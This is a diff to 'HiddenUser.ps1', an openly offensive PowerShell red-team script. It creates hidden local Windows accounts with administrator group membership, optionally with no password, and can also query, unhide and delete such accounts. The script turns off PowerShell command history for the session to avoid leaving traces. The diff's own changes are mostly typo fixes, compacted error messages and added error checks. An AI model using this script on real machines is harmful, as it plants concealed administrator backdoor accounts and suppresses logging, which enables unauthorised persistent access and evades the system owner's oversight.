@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: administrator privileges
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    This CmdLet Querys, Creates or Deletes windows hidden accounts.
@@ -14,11 +14,11 @@
 
 .NOTES
    Required Dependencies: Administrator Privileges on shell
-   Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
-   The new created user account will have 'administrators' privileges rigths set.
+   Mandatory to {Create|Delete} or set the account {Visible|Hidden} state
+   The new created user account will be added to 'administrators' Group Name.
 
 .Parameter Action
-   Accepts argument: Query, Create, Delete, Visible, Hidden
+   Accepts arguments: Query, Create, Delete, Visible, Hidden
 
 .Parameter UserName
    Accepts the User Account Name (default: SSAredTeam)
@@ -32,15 +32,15 @@
 
 .EXAMPLE
    PS C:\> .\HiddenUser.ps1 -Action Query
-   Enumerate ALL Account's present in local system
+   Enumerate ALL Account's present on local system
 
 .EXAMPLE
    PS C:\> .\HiddenUser.ps1 -Action Create -UserName "pedro"
-   Creates 'pedro' hidden account without password access and 'Adminitrator' privs
+   Creates 'pedro' hidden account without password access and 'Administrator' privs
 
 .EXAMPLE
    PS C:\> .\HiddenUser.ps1 -Action Create -UserName "pedro" -Password "mys3cr3tp4ss"
-   Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Adminitrator' privs
+   Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Administrator' privs
 
 .EXAMPLE
    PS C:\> .\HiddenUser.ps1 -Action Visible -UserName "pedro"
@@ -52,7 +52,7 @@
 
 .EXAMPLE
    PS C:\> .\HiddenUser.ps1 -Action Delete -UserName "pedro"
-   Deletes 'pedro' hidden account
+   Deletes 'pedro' hidden|visible account
 
 .INPUTS
    None. You cannot pipe objects into HiddenUser.ps1
@@ -79,15 +79,16 @@
 
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
-
 If($Action -ieq "Query"){
 
    <#
    .SYNOPSIS
+      Author: @r00t-3xp10it
       Helper - Enumerate user accounts {active|inactive}
 
    .NOTES
       Required Dependencies: none
+      This function works under 'UserLand' privs
 
    .EXAMPLE
       PS C:\> .\HiddenUser.ps1 -Action Query
@@ -108,6 +109,7 @@ If($Action -ieq "Query"){
 
    #>
 
+   Write-Host ""
    If($UserName -ieq "false"){
 
       $UserName = "*" ## Enum ALL account's
@@ -125,9 +127,7 @@ If($Action -ieq "Query"){
 
       }Else{## Account Name NOT found
 
-         Write-Host "`n`n"
-         Write-Host "[error] '$UserName' Account Not found in $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
-         Write-Host "`n`n"
+         Write-Host "`n`n[error] '$UserName' Account Not found in $Env:COMPUTERNAME!`n`n" -ForegroundColor Red -BackgroundColor Black
 
       }
 
@@ -138,6 +138,7 @@ If($Action -ieq "Query"){
 
    <#
    .SYNOPSIS
+      Author: @r00t-3xp10it
       Helper - Create Hidden user account 
 
    .NOTES
@@ -159,13 +160,13 @@ If($Action -ieq "Query"){
 
    #>
 
+   Write-Host ""
    ## Make sure we have the rigth privileges before continue any further
    $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
    If(-not($IsClientAdmin)){## Non Administrator privileges found
    
-      Write-Host "`n`n"
-      Write-Host "[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "`n`n";exit ## Exit @HiddenUser
+      Write-Host "`n`n[error] Administrator privileges required on shell!`n`n" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @HiddenUser
       
    }
 
@@ -180,9 +181,8 @@ If($Action -ieq "Query"){
    $CheckAccount = Get-LocalUser $UserName -EA SilentlyContinue
    If($CheckAccount){## [error] User Account found!
    
-      Write-Host "`n`n"
-      Write-Host "[error] $UserName Account allready exists in $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "`n`n";exit ## Exit @HiddenUser
+      Write-Host "`n`n[error] $UserName Account allready exists in $Env:COMPUTERNAME!`n`n" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @HiddenUser
       
    }
 
@@ -205,7 +205,16 @@ If($Action -ieq "Query"){
    If($AdminGroupName){## Admin Group Name found!
    
       Add-LocalGroupMember -Group "$AdminGroupName" -Member "$UserName"
+      If(-not($LASTEXITCODE -eq 0)){## Failed to add created account to 'administrators' Group
+
+         Write-Host "`n`n[error] fail to add '$UserName' account to '$AdminGroupName' Group!`n`n" -ForegroundColor Red -BackgroundColor Black
+
+      }
       
+   }Else{## Admin Group Name NOT found!
+
+      Write-Host "`n`n[error] fail to add '$UserName' account to 'Administrators' Group!`n`n" -ForegroundColor Red -BackgroundColor Black
+
    }
 
    ## De-Activate account { hidden }
@@ -218,11 +227,12 @@ If($Action -ieq "Query"){
 
    <#
    .SYNOPSIS
+      Author: @r00t-3xp10it
       Helper - Delete User Account {active|inactive}
 
    .NOTES
       Required Dependencies: Administrator Privileges on shell
-      This CmdLet prevents the deletion of 'system' account {administrator|Guest}
+      This CmdLet prevents the deletion of 'system' account's {administrator|Guest}
 
    .EXAMPLE
       PS C:\> .\HiddenUser.ps1 -Action Delete -UserName "SSAredTeam"
@@ -239,13 +249,13 @@ If($Action -ieq "Query"){
 
    #>
 
+   Write-Host ""
    ## Make sure we have the rigth privileges before continue any further
    $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
    If(-not($IsClientAdmin)){## Non Administrator privileges found
    
-      Write-Host "`n`n"
-      Write-Host "[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "`n`n";exit ## Exit @HiddenUser
+      Write-Host "`n`n[error] Administrator privileges required on shell!`n`n" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @HiddenUser
       
    }
    
@@ -260,9 +270,8 @@ If($Action -ieq "Query"){
 
    If($UserName -ieq "$AdminGroupName" -or $UserName -ieq "$guestaccchecks"){
    
-      Write-Host "`n`n"
-      Write-Host "[error] '$UserName' its an 'system' mandatory account!" -ForegroundColor Red -BackgroundColor Black   
-      Write-Host "`n`n";exit ## Exit @HiddenUser
+      Write-Host "`n`n[error] '$UserName' its an 'system' mandatory account!`n`n" -ForegroundColor Red -BackgroundColor Black   
+      exit ## Exit @HiddenUser
       
    }
     
@@ -272,14 +281,12 @@ If($Action -ieq "Query"){
    
       Remove-LocalUser -Name "$UserName"|Out-Null
       ## [cmd] net user $UserName /DELETE|Out-Null
-      Get-LocalUser * |
-         Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table
+      Get-LocalUser * | Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table
          
    }Else{## Account Name NOT found
    
-      Write-Host "`n`n"
-      Write-Host "`[error] '$UserName' Account Not found in $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "`n`n";exit ## Exit @HiddenUser
+      Write-Host "`n`n[error] '$UserName' Account Not found in $Env:COMPUTERNAME!`n`n" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @HiddenUser
       
    }
 
@@ -287,10 +294,11 @@ If($Action -ieq "Query"){
 
    <#
    .SYNOPSIS
+      Author: @r00t-3xp10it
       Helper - Make existing User Account {Visible|Hidden}
 
    .NOTES
-      Required Dependencies: Administrator Privileges
+      Required Dependencies: Administrator Privileges on shell
       Required Dependencies: User account must exist to be modify!
 
    .EXAMPLE
@@ -307,13 +315,13 @@ If($Action -ieq "Query"){
          True SSAredTeam                   01/03/2021 18:58:42             True
    #>
 
+   Write-Host ""
    ## Make sure we have the rigth privileges before continue any further
    $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
    If(-not($IsClientAdmin)){## Non Administrator privileges found
    
-      Write-Host "`n`n"
-      Write-Host "[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "`n`n";exit ## Exit @HiddenUser
+      Write-Host "`n`n[error] Administrator privileges required on shell!`n`n" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @HiddenUser
       
    }
 
@@ -330,9 +338,8 @@ If($Action -ieq "Query"){
          
    }Else{## Account Name NOT found
    
-      Write-Host "`n`n"
-      Write-Host "[error] '$UserName' Account Not found in $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "`n`n";exit ## Exit @HiddenUser
+      Write-Host "`n`n[error] '$UserName' Account Not found in $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @HiddenUser
    }
 
 Write-Host ""
